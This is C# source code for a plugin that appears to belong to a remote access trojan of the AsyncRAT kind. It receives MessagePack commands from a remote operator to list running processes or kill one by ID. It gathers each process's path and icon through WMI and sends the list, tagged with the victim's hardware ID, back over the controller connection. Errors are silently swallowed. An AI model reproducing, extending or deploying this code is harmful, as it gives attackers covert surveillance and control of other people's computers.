using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "processManager":
                {
                    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                    {
                        case "List":
                        {
                            new HandleProcessManager().ProcessList();
                            break;
                        }

                        case "Kill":
                        {
                            new HandleProcessManager().ProcessKill(
                                Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                            break;
                        }
                    }
                }
                    break;
            }
        }
    }

    public class HandleProcessManager
    {
        public void ProcessKill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID) process.Kill();
                }
                catch
                {
                }

                ;
            }

            ProcessList();
        }

        public void ProcessList()
        {
            try
            {
                var sb = new StringBuilder();
                var query = "SELECT ProcessId, Name, ExecutablePath FROM Win32_Process";
                using (var searcher = new ManagementObjectSearcher(query))
                using (var results = searcher.Get())
                {
                    var processes = results.Cast<ManagementObject>().Select(x => new
                    {
                        ProcessId = (uint)x["ProcessId"],
                        Name = (string)x["Name"],
                        ExecutablePath = (string)x["ExecutablePath"]
                    });
                    foreach (var p in processes)
                        if (File.Exists(p.ExecutablePath))
                        {
                            var name = p.ExecutablePath;
                            var key = p.ProcessId.ToString();
                            var icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
                            var bmpIcon = icon.ToBitmap();
                            using (var ms = new MemoryStream())
                            {
                                bmpIcon.Save(ms, ImageFormat.Png);
                                sb.Append(name + "-=>" + key + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                            }
                        }
                }

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "processManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch
            {
            }
        }
    }
}